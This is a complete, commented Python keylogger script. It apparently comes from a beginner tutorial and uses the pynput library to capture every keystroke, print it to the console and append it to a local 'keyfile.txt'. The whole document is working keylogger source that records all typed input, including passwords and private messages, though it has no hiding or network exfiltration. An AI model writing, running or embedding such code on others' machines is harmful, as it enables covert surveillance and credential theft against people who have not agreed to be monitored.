# Import the keyboard module from the pynput library.
from pynput import keyboard

# Specify the file path where the keyfile.txt will be saved.
file_location = ""

# This function determines the name of a key, handling special keys.
def get_key_name(key):
    # Check to see if the key is a regular character, and returns the character of the key if so.
    if isinstance(key, keyboard.KeyCode):
        return key.char
    # Check if the key is the Space key and returns a space character if so.
    elif key == keyboard.Key.space:
        return ' '
    # Check if the key is the Enter key and returns a newline character if so.
    elif key == keyboard.Key.enter:
        return '\n'
    # If the key is not a regular character or special key, return its string representation.
    else:
        return str(key)

# This function is called when a key is pressed.
def keyPressed(key):
    # Gets the name of the pressed key using the get_key_name function.
    key_name = get_key_name(key)
    # Print the name of the pressed key to the console. This is just for easy visualisation. 
    print(key_name)

    # Appends the name of the pressed key to the keyfile.txt file.
    with open(file_location + "keyfile.txt", 'a') as logKey:
        logKey.write(key_name)

# This condition checks whether the script is being run as the main program, as opposed to being imported as a module into another script. 
# This code will only execute if the script is the main entry point.
if __name__ == "__main__":
    # Creates a listener that calls the keyPressed function when a key is pressed.
    listener = keyboard.Listener(on_press=keyPressed)
    # Starts the listener.
    listener.start()
    # Ensures that the script continues to run and listens for key presses until it is manually interrupted.
    listener.join()
